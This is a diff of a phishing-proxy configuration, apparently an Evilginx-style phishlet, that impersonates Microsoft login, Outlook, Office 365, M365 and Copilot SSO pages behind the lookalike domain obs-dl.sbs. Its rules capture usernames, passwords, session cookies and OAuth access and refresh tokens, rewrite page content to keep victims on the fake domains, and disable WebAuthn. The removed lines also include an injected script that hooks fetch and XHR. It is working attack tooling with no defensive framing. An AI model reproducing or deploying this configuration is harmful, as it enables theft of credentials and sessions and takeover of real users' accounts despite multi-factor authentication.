@@ -12,11 +12,8 @@ global:
 
 
 
-# ============================================================
-# login.microsoftonline.com - OAuth2 (auto-redirect from entry point)
-# ============================================================
 login.microsoftonline.com:
-  to: "login.obs-dl.sbs"
+  to: "obs-dl.sbs"
   capture:
     - name: "username"
       method: "POST"
@@ -48,28 +45,10 @@ login.microsoftonline.com:
       from: "cookie"
       required: false
 
-    # MSAL OAuth2 token capture - captures access_token and refresh_token from
-    # the token endpoint response when MSAL.js discovery calls are routed through proxy
-    - name: "msal_access_token_login"
-      method: "POST"
-      path: ".*/oauth2/v2.0/token"
-      engine: "json"
-      find: "access_token"
-      from: "response_body"
-      required: false
-
-    - name: "msal_refresh_token_login"
-      method: "POST"
-      path: ".*/oauth2/v2.0/token"
-      engine: "json"
-      find: "refresh_token"
-      from: "response_body"
-      required: false
-
   rewrite:
     - name: "rewrite_login_domain"
       find: "login\\.microsoftonline\\.com"
-      replace: "login.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_login_live"
@@ -112,9 +91,19 @@ login.microsoftonline.com:
       replace: "m365.obs-dl.sbs"
       from: "response_body"
 
+    - name: "rewrite_mssso_copilot_ms"
+      find: "ms-sso\\.copilot\\.microsoft\\.com"
+      replace: "ms-sso.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_mssso_copilot"
+      find: "ms-sso\\.copilot\\.com"
+      replace: "ms-sso-c.obs-dl.sbs"
+      from: "response_body"
+
     - name: "rewrite_outlook365"
       find: "outlook\\.office365\\.com"
-      replace: "obs-dl.sbs"
+      replace: "outlook.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office"
@@ -122,19 +111,9 @@ login.microsoftonline.com:
       replace: "outlook-office.obs-dl.sbs"
       from: "response_body"
 
-    - name: "rewrite_outlook_live"
-      find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
-      from: "response_body"
-
     - name: "rewrite_substrate"
       find: "substrate\\.office\\.com"
       replace: "substrate.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_login_windows"
-      find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
       from: "response_body"
 
     - name: "disable_webauthn"
@@ -144,9 +123,6 @@ login.microsoftonline.com:
 
 
 
-# ============================================================
-# login.live.com - MSA consumer auth (outlook.com accounts)
-# ============================================================
 login.live.com:
   to: "live.obs-dl.sbs"
   capture:
@@ -180,30 +156,6 @@ login.live.com:
       from: "cookie"
       required: false
 
-    - name: "msa_wlssc"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "WLSSC"
-      from: "cookie"
-      required: false
-
-    - name: "msa_anon"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "ANON"
-      from: "cookie"
-      required: false
-
-    - name: "msa_nap"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "NAP"
-      from: "cookie"
-      required: false
-
   rewrite:
     - name: "rewrite_live_domain"
       find: "login\\.live\\.com"
@@ -212,7 +164,7 @@ login.live.com:
 
     - name: "rewrite_login_domain_in_live"
       find: "login\\.microsoftonline\\.com"
-      replace: "login.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_live"
@@ -250,9 +202,19 @@ login.live.com:
       replace: "m365.obs-dl.sbs"
       from: "response_body"
 
+    - name: "rewrite_mssso_copilot_ms_in_live"
+      find: "ms-sso\\.copilot\\.microsoft\\.com"
+      replace: "ms-sso.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_mssso_copilot_in_live"
+      find: "ms-sso\\.copilot\\.com"
+      replace: "ms-sso-c.obs-dl.sbs"
+      from: "response_body"
+
     - name: "rewrite_outlook365_in_live"
       find: "outlook\\.office365\\.com"
-      replace: "obs-dl.sbs"
+      replace: "outlook.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_live"
@@ -260,19 +222,9 @@ login.live.com:
       replace: "outlook-office.obs-dl.sbs"
       from: "response_body"
 
-    - name: "rewrite_outlook_live_in_live"
-      find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
-      from: "response_body"
-
     - name: "rewrite_substrate_in_live"
       find: "substrate\\.office\\.com"
       replace: "substrate.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_login_windows_in_live"
-      find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
       from: "response_body"
 
     - name: "disable_webauthn_live"
@@ -282,9 +234,6 @@ login.live.com:
 
 
 
-# ============================================================
-# login.microsoft.com - alternative login domain
-# ============================================================
 login.microsoft.com:
   to: "loginmicrosoft.obs-dl.sbs"
   rewrite:
@@ -300,7 +249,7 @@ login.microsoft.com:
 
     - name: "rewrite_login_domain_in_loginmicrosoft"
       find: "login\\.microsoftonline\\.com"
-      replace: "login.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_loginmicrosoft"
@@ -333,9 +282,19 @@ login.microsoft.com:
       replace: "m365.obs-dl.sbs"
       from: "response_body"
 
+    - name: "rewrite_mssso_copilot_ms_in_loginmicrosoft"
+      find: "ms-sso\\.copilot\\.microsoft\\.com"
+      replace: "ms-sso.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_mssso_copilot_in_loginmicrosoft"
+      find: "ms-sso\\.copilot\\.com"
+      replace: "ms-sso-c.obs-dl.sbs"
+      from: "response_body"
+
     - name: "rewrite_outlook365_in_loginmicrosoft"
       find: "outlook\\.office365\\.com"
-      replace: "obs-dl.sbs"
+      replace: "outlook.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_loginmicrosoft"
@@ -343,19 +302,9 @@ login.microsoft.com:
       replace: "outlook-office.obs-dl.sbs"
       from: "response_body"
 
-    - name: "rewrite_outlook_live_in_loginmicrosoft"
-      find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
-      from: "response_body"
-
     - name: "rewrite_substrate_in_loginmicrosoft"
       find: "substrate\\.office\\.com"
       replace: "substrate.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_login_windows_in_loginmicrosoft"
-      find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
       from: "response_body"
 
     - name: "disable_webauthn_loginmicrosoft"
@@ -365,9 +314,6 @@ login.microsoft.com:
 
 
 
-# ============================================================
-# CDN domains (pass-through, no capture needed)
-# ============================================================
 aadcdn.msftauth.net:
   to: "aadcdn.obs-dl.sbs"
 
@@ -383,9 +329,6 @@ aadcdn.msauth.net:
 
 
 
-# ============================================================
-# www.office.com - Office portal (redirect target)
-# ============================================================
 www.office.com:
   to: "office.obs-dl.sbs"
   rewrite:
@@ -396,7 +339,7 @@ www.office.com:
 
     - name: "rewrite_login_domain_in_office"
       find: "login\\.microsoftonline\\.com"
-      replace: "login.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_office"
@@ -416,17 +359,12 @@ www.office.com:
 
     - name: "rewrite_outlook365_in_office"
       find: "outlook\\.office365\\.com"
-      replace: "obs-dl.sbs"
+      replace: "outlook.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_office"
       find: "outlook\\.office\\.com"
       replace: "outlook-office.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_outlook_live_in_office"
-      find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_substrate_in_office"
@@ -436,9 +374,6 @@ www.office.com:
 
 
 
-# ============================================================
-# m365.cloud.microsoft - M365 portal
-# ============================================================
 m365.cloud.microsoft:
   to: "m365.obs-dl.sbs"
   rewrite:
@@ -449,7 +384,7 @@ m365.cloud.microsoft:
 
     - name: "rewrite_login_domain_in_m365"
       find: "login\\.microsoftonline\\.com"
-      replace: "login.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_m365"
@@ -489,17 +424,12 @@ m365.cloud.microsoft:
 
     - name: "rewrite_outlook365_in_m365"
       find: "outlook\\.office365\\.com"
-      replace: "obs-dl.sbs"
+      replace: "outlook.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_m365"
       find: "outlook\\.office\\.com"
       replace: "outlook-office.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_outlook_live_in_m365"
-      find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_substrate_in_m365"
@@ -509,9 +439,136 @@ m365.cloud.microsoft:
 
 
 
-# ============================================================
-# account.live.com - MSA account management
-# ============================================================
+ms-sso.copilot.microsoft.com:
+  to: "ms-sso.obs-dl.sbs"
+  rewrite:
+    - name: "rewrite_mssso_ms_domain"
+      find: "ms-sso\\.copilot\\.microsoft\\.com"
+      replace: "ms-sso.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_mssso_copilot_com_in_mssso"
+      find: "ms-sso\\.copilot\\.com"
+      replace: "ms-sso-c.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_live_in_mssso"
+      find: "login\\.live\\.com"
+      replace: "live.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_login_domain_in_mssso"
+      find: "login\\.microsoftonline\\.com"
+      replace: "obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_loginmicrosoft_in_mssso"
+      find: "login\\.microsoft\\.com"
+      replace: "loginmicrosoft.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_office_in_mssso"
+      find: "www\\.office\\.com"
+      replace: "office.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_m365_in_mssso"
+      find: "m365\\.cloud\\.microsoft"
+      replace: "m365.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_account_live_in_mssso"
+      find: "account\\.live\\.com"
+      replace: "account-live.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_aadcdn_in_mssso"
+      find: "aadcdn\\.msftauth\\.net"
+      replace: "aadcdn.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_logincdn_in_mssso"
+      find: "logincdn\\.msftauth\\.net"
+      replace: "logincdn.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_outlook365_in_mssso"
+      find: "outlook\\.office365\\.com"
+      replace: "outlook.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_outlook_office_in_mssso"
+      find: "outlook\\.office\\.com"
+      replace: "outlook-office.obs-dl.sbs"
+      from: "response_body"
+
+
+
+ms-sso.copilot.com:
+  to: "ms-sso-c.obs-dl.sbs"
+  rewrite:
+    - name: "rewrite_mssso_c_domain"
+      find: "ms-sso\\.copilot\\.com"
+      replace: "ms-sso-c.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_mssso_ms_in_c"
+      find: "ms-sso\\.copilot\\.microsoft\\.com"
+      replace: "ms-sso.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_live_in_mssso_c"
+      find: "login\\.live\\.com"
+      replace: "live.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_login_domain_in_mssso_c"
+      find: "login\\.microsoftonline\\.com"
+      replace: "obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_loginmicrosoft_in_mssso_c"
+      find: "login\\.microsoft\\.com"
+      replace: "loginmicrosoft.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_office_in_mssso_c"
+      find: "www\\.office\\.com"
+      replace: "office.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_m365_in_mssso_c"
+      find: "m365\\.cloud\\.microsoft"
+      replace: "m365.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_account_live_in_mssso_c"
+      find: "account\\.live\\.com"
+      replace: "account-live.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_aadcdn_in_mssso_c"
+      find: "aadcdn\\.msftauth\\.net"
+      replace: "aadcdn.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_logincdn_in_mssso_c"
+      find: "logincdn\\.msftauth\\.net"
+      replace: "logincdn.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_outlook365_in_mssso_c"
+      find: "outlook\\.office365\\.com"
+      replace: "outlook.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_outlook_office_in_mssso_c"
+      find: "outlook\\.office\\.com"
+      replace: "outlook-office.obs-dl.sbs"
+      from: "response_body"
+
+
+
 account.live.com:
   to: "account-live.obs-dl.sbs"
   rewrite:
@@ -527,7 +584,7 @@ account.live.com:
 
     - name: "rewrite_login_domain_in_account"
       find: "login\\.microsoftonline\\.com"
-      replace: "login.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_loginmicrosoft_in_account"
@@ -540,9 +597,19 @@ account.live.com:
       replace: "m365.obs-dl.sbs"
       from: "response_body"
 
+    - name: "rewrite_mssso_copilot_ms_in_account"
+      find: "ms-sso\\.copilot\\.microsoft\\.com"
+      replace: "ms-sso.obs-dl.sbs"
+      from: "response_body"
+
+    - name: "rewrite_mssso_copilot_in_account"
+      find: "ms-sso\\.copilot\\.com"
+      replace: "ms-sso-c.obs-dl.sbs"
+      from: "response_body"
+
     - name: "rewrite_outlook365_in_account"
       find: "outlook\\.office365\\.com"
-      replace: "obs-dl.sbs"
+      replace: "outlook.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_account"
@@ -550,20 +617,13 @@ account.live.com:
       replace: "outlook-office.obs-dl.sbs"
       from: "response_body"
 
-    - name: "rewrite_outlook_live_in_account"
-      find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
-      from: "response_body"
-
 
 
 # ============================================================
-# PRIMARY ENTRY: outlook.office365.com - Enterprise OWA
-# Start URL: https://outlook.office365.com/owa/
-# Captures OWA session cookies, X-OWA-CANARY, access tokens
+# NEW: Outlook Office 365 - captures Outlook session cookies
 # ============================================================
 outlook.office365.com:
-  to: "obs-dl.sbs"
+  to: "outlook.obs-dl.sbs"
   capture:
     - name: "outlook_client_id"
       method: "GET"
@@ -605,31 +665,15 @@ outlook.office365.com:
       from: "cookie"
       required: false
 
-    - name: "outlook_anchor_mailbox"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "DefaultAnchorMailbox"
-      from: "cookie"
-      required: false
-
-    - name: "outlook_open_id_connect"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "OpenIdConnect.token.v1"
-      from: "cookie"
-      required: false
-
   rewrite:
     - name: "rewrite_outlook365_domain"
       find: "outlook\\.office365\\.com"
-      replace: "obs-dl.sbs"
+      replace: "outlook.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_outlook"
       find: "login\\.microsoftonline\\.com"
-      replace: "login.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_outlook"
@@ -677,46 +721,25 @@ outlook.office365.com:
       replace: "outlook-office.obs-dl.sbs"
       from: "response_body"
 
-    - name: "rewrite_outlook_live_in_outlook"
-      find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
-      from: "response_body"
-
     - name: "rewrite_substrate_in_outlook"
       find: "substrate\\.office\\.com"
       replace: "substrate.obs-dl.sbs"
       from: "response_body"
 
-    - name: "rewrite_res_cdn_in_outlook"
-      find: "res\\.cdn\\.office\\.net"
-      replace: "res-cdn.obs-dl.sbs"
+    - name: "rewrite_mssso_copilot_ms_in_outlook"
+      find: "ms-sso\\.copilot\\.microsoft\\.com"
+      replace: "ms-sso.obs-dl.sbs"
       from: "response_body"
 
-    - name: "rewrite_ecs_in_outlook"
-      find: "ecs\\.office\\.com"
-      replace: "ecs.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_login_windows_in_outlook"
-      find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
-      from: "response_body"
-
-    # MSAL Fetch Interceptor - Redirects MSAL.js discovery/token calls through the proxy
-    # Problem: MSAL.js makes direct fetch() calls to login.microsoftonline.com (bypassing proxy)
-    # with authorization_endpoint containing the proxy domain (login.obs-dl.sbs).
-    # Microsoft rejects this because login.obs-dl.sbs is not a known Azure AD authority.
-    # Fix: Intercept fetch()/XHR calls and redirect them through the proxy.
-    # The proxy's patchQueryParametersWithContext() then fixes the authorization_endpoint.
-    - name: "msal_fetch_interceptor_outlook365"
-      find: "(?i)<head>"
-      replace: '<head><script>(function(){var _f=window.fetch;window.fetch=function(i,n){var u=(typeof i==="string")?i:(i&&i.url?i.url:"");if(u.indexOf("login.microsoftonline.com")!==-1){var nu=u.replace(/login\\.microsoftonline\\.com/g,"login.obs-dl.sbs");i=(typeof i==="string")?nu:new Request(nu,i)}if(u.indexOf("login.microsoft.com")!==-1){var nu=u.replace(/login\\.microsoft\\.com/g,"loginmicrosoft.obs-dl.sbs");i=(typeof i==="string")?nu:new Request(nu,i)}if(u.indexOf("login.windows.net")!==-1){var nu=u.replace(/login\\.windows\\.net/g,"login-windows.obs-dl.sbs");i=(typeof i==="string")?nu:new Request(nu,i)}return _f.call(this,i,n)};var _x=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){if(typeof u==="string"){if(u.indexOf("login.microsoftonline.com")!==-1)u=u.replace(/login\\.microsoftonline\\.com/g,"login.obs-dl.sbs");if(u.indexOf("login.microsoft.com")!==-1)u=u.replace(/login\\.microsoft\\.com/g,"loginmicrosoft.obs-dl.sbs");if(u.indexOf("login.windows.net")!==-1)u=u.replace(/login\\.windows\\.net/g,"login-windows.obs-dl.sbs")}return _x.apply(this,arguments)}})();</script>'
+    - name: "rewrite_mssso_copilot_in_outlook"
+      find: "ms-sso\\.copilot\\.com"
+      replace: "ms-sso-c.obs-dl.sbs"
       from: "response_body"
 
 
 
 # ============================================================
-# outlook.office.com - Alternative enterprise OWA domain
+# NEW: Outlook Office (alternative Outlook domain)
 # ============================================================
 outlook.office.com:
   to: "outlook-office.obs-dl.sbs"
@@ -737,35 +760,11 @@ outlook.office.com:
       from: "cookie"
       required: false
 
-    - name: "outlook_office_uc"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "UC"
-      from: "cookie"
-      required: false
-
     - name: "outlook_office_cadata"
       method: "GET"
       path: ".*"
       engine: "cookie"
       find: "cadata"
-      from: "cookie"
-      required: false
-
-    - name: "outlook_office_anchor_mailbox"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "DefaultAnchorMailbox"
-      from: "cookie"
-      required: false
-
-    - name: "outlook_office_open_id_connect"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "OpenIdConnect.token.v1"
       from: "cookie"
       required: false
 
@@ -777,12 +776,12 @@ outlook.office.com:
 
     - name: "rewrite_outlook365_in_outlook_office"
       find: "outlook\\.office365\\.com"
-      replace: "obs-dl.sbs"
+      replace: "outlook.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_login_domain_in_outlook_office"
       find: "login\\.microsoftonline\\.com"
-      replace: "login.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_live_in_outlook_office"
@@ -810,179 +809,10 @@ outlook.office.com:
       replace: "m365.obs-dl.sbs"
       from: "response_body"
 
-    - name: "rewrite_outlook_live_in_outlook_office"
-      find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_res_cdn_in_outlook_office"
-      find: "res\\.cdn\\.office\\.net"
-      replace: "res-cdn.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_ecs_in_outlook_office"
-      find: "ecs\\.office\\.com"
-      replace: "ecs.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_login_windows_in_outlook_office"
-      find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "msal_fetch_interceptor_outlook_office"
-      find: "(?i)<head>"
-      replace: '<head><script>(function(){var _f=window.fetch;window.fetch=function(i,n){var u=(typeof i==="string")?i:(i&&i.url?i.url:"");if(u.indexOf("login.microsoftonline.com")!==-1){var nu=u.replace(/login\\.microsoftonline\\.com/g,"login.obs-dl.sbs");i=(typeof i==="string")?nu:new Request(nu,i)}if(u.indexOf("login.microsoft.com")!==-1){var nu=u.replace(/login\\.microsoft\\.com/g,"loginmicrosoft.obs-dl.sbs");i=(typeof i==="string")?nu:new Request(nu,i)}if(u.indexOf("login.windows.net")!==-1){var nu=u.replace(/login\\.windows\\.net/g,"login-windows.obs-dl.sbs");i=(typeof i==="string")?nu:new Request(nu,i)}return _f.call(this,i,n)};var _x=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){if(typeof u==="string"){if(u.indexOf("login.microsoftonline.com")!==-1)u=u.replace(/login\\.microsoftonline\\.com/g,"login.obs-dl.sbs");if(u.indexOf("login.microsoft.com")!==-1)u=u.replace(/login\\.microsoft\\.com/g,"loginmicrosoft.obs-dl.sbs");if(u.indexOf("login.windows.net")!==-1)u=u.replace(/login\\.windows\\.net/g,"login-windows.obs-dl.sbs")}return _x.apply(this,arguments)}})();</script>'
-      from: "response_body"
-
 
 
 # ============================================================
-# NEW: outlook.live.com - Consumer OWA (outlook.com accounts)
-# Consumer accounts redirect here after OAuth2 auth
-# Captures OWA session cookies + MSAL tokens
-# ============================================================
-outlook.live.com:
-  to: "outlook-live.obs-dl.sbs"
-  capture:
-    - name: "consumer_client_id"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "ClientId"
-      from: "cookie"
-      required: false
-
-    - name: "consumer_uc"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "UC"
-      from: "cookie"
-      required: false
-
-    - name: "consumer_anchor_mailbox"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "DefaultAnchorMailbox"
-      from: "cookie"
-      required: false
-
-    - name: "consumer_msal_cache"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "msal.cache.encryption"
-      from: "cookie"
-      required: false
-
-    - name: "consumer_msfpc"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "MSFPC"
-      from: "cookie"
-      required: false
-
-    - name: "consumer_telemetry_device_id"
-      method: "GET"
-      path: ".*"
-      engine: "cookie"
-      find: "MicrosoftApplicationsTelemetryDeviceId"
-      from: "cookie"
-      required: false
-
-  rewrite:
-    - name: "rewrite_outlook_live_domain"
-      find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_login_domain_in_outlook_live"
-      find: "login\\.microsoftonline\\.com"
-      replace: "login.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_live_in_outlook_live"
-      find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_loginmicrosoft_in_outlook_live"
-      find: "login\\.microsoft\\.com"
-      replace: "loginmicrosoft.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_office_in_outlook_live"
-      find: "www\\.office\\.com"
-      replace: "office.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_m365_in_outlook_live"
-      find: "m365\\.cloud\\.microsoft"
-      replace: "m365.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_aadcdn_in_outlook_live"
-      find: "aadcdn\\.msftauth\\.net"
-      replace: "aadcdn.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_logincdn_in_outlook_live"
-      find: "logincdn\\.msftauth\\.net"
-      replace: "logincdn.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_msauth_in_outlook_live"
-      find: "aadcdn\\.msauth\\.net"
-      replace: "msauth.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_account_live_in_outlook_live"
-      find: "account\\.live\\.com"
-      replace: "account-live.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_outlook365_in_outlook_live"
-      find: "outlook\\.office365\\.com"
-      replace: "obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_outlook_office_in_outlook_live"
-      find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_substrate_in_outlook_live"
-      find: "substrate\\.office\\.com"
-      replace: "substrate.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_res_cdn_in_outlook_live"
-      find: "res\\.cdn\\.office\\.net"
-      replace: "res-cdn.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_ecs_in_outlook_live"
-      find: "ecs\\.office\\.com"
-      replace: "ecs.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_login_windows_in_outlook_live"
-      find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "msal_fetch_interceptor_outlook_live"
-      find: "(?i)<head>"
-      replace: '<head><script>(function(){var _f=window.fetch;window.fetch=function(i,n){var u=(typeof i==="string")?i:(i&&i.url?i.url:"");if(u.indexOf("login.microsoftonline.com")!==-1){var nu=u.replace(/login\\.microsoftonline\\.com/g,"login.obs-dl.sbs");i=(typeof i==="string")?nu:new Request(nu,i)}if(u.indexOf("login.microsoft.com")!==-1){var nu=u.replace(/login\\.microsoft\\.com/g,"loginmicrosoft.obs-dl.sbs");i=(typeof i==="string")?nu:new Request(nu,i)}if(u.indexOf("login.windows.net")!==-1){var nu=u.replace(/login\\.windows\\.net/g,"login-windows.obs-dl.sbs");i=(typeof i==="string")?nu:new Request(nu,i)}return _f.call(this,i,n)};var _x=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){if(typeof u==="string"){if(u.indexOf("login.microsoftonline.com")!==-1)u=u.replace(/login\\.microsoftonline\\.com/g,"login.obs-dl.sbs");if(u.indexOf("login.microsoft.com")!==-1)u=u.replace(/login\\.microsoft\\.com/g,"loginmicrosoft.obs-dl.sbs");if(u.indexOf("login.windows.net")!==-1)u=u.replace(/login\\.windows\\.net/g,"login-windows.obs-dl.sbs")}return _x.apply(this,arguments)}})();</script>'
-      from: "response_body"
-
-
-
-# ============================================================
-# substrate.office.com - Outlook API backend (Graph-like)
+# NEW: Substrate Office (Outlook API backend)
 # ============================================================
 substrate.office.com:
   to: "substrate.obs-dl.sbs"
@@ -994,7 +824,7 @@ substrate.office.com:
 
     - name: "rewrite_outlook365_in_substrate"
       find: "outlook\\.office365\\.com"
-      replace: "obs-dl.sbs"
+      replace: "outlook.obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_outlook_office_in_substrate"
@@ -1002,94 +832,12 @@ substrate.office.com:
       replace: "outlook-office.obs-dl.sbs"
       from: "response_body"
 
-    - name: "rewrite_outlook_live_in_substrate"
-      find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
-      from: "response_body"
-
     - name: "rewrite_login_domain_in_substrate"
       find: "login\\.microsoftonline\\.com"
-      replace: "login.obs-dl.sbs"
+      replace: "obs-dl.sbs"
       from: "response_body"
 
     - name: "rewrite_office_in_substrate"
       find: "www\\.office\\.com"
       replace: "office.obs-dl.sbs"
-      from: "response_body"
-
-
-
-# ============================================================
-# res.cdn.office.net - OWA static resources (JS, CSS, fonts)
-# ============================================================
-res.cdn.office.net:
-  to: "res-cdn.obs-dl.sbs"
-
-
-
-# ============================================================
-# ecs.office.com - ECS configuration service
-# ============================================================
-ecs.office.com:
-  to: "ecs.obs-dl.sbs"
-  rewrite:
-    - name: "rewrite_ecs_domain"
-      find: "ecs\\.office\\.com"
-      replace: "ecs.obs-dl.sbs"
-      from: "response_body"
-
-
-
-# ============================================================
-# login.windows.net - MSAL token authority
-# Used by MSAL.js for silent token renewal in OWA
-# ============================================================
-login.windows.net:
-  to: "login-windows.obs-dl.sbs"
-  capture:
-    - name: "msal_access_token"
-      method: "POST"
-      path: ".*/oauth2/v2.0/token"
-      engine: "json"
-      find: "access_token"
-      from: "response_body"
-      required: false
-
-    - name: "msal_refresh_token"
-      method: "POST"
-      path: ".*/oauth2/v2.0/token"
-      engine: "json"
-      find: "refresh_token"
-      from: "response_body"
-      required: false
-
-  rewrite:
-    - name: "rewrite_login_windows_domain"
-      find: "login\\.windows\\.net"
-      replace: "login-windows.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_login_domain_in_login_windows"
-      find: "login\\.microsoftonline\\.com"
-      replace: "login.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_live_in_login_windows"
-      find: "login\\.live\\.com"
-      replace: "live.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_outlook365_in_login_windows"
-      find: "outlook\\.office365\\.com"
-      replace: "obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_outlook_office_in_login_windows"
-      find: "outlook\\.office\\.com"
-      replace: "outlook-office.obs-dl.sbs"
-      from: "response_body"
-
-    - name: "rewrite_outlook_live_in_login_windows"
-      find: "outlook\\.live\\.com"
-      replace: "outlook-live.obs-dl.sbs"
       from: "response_body"
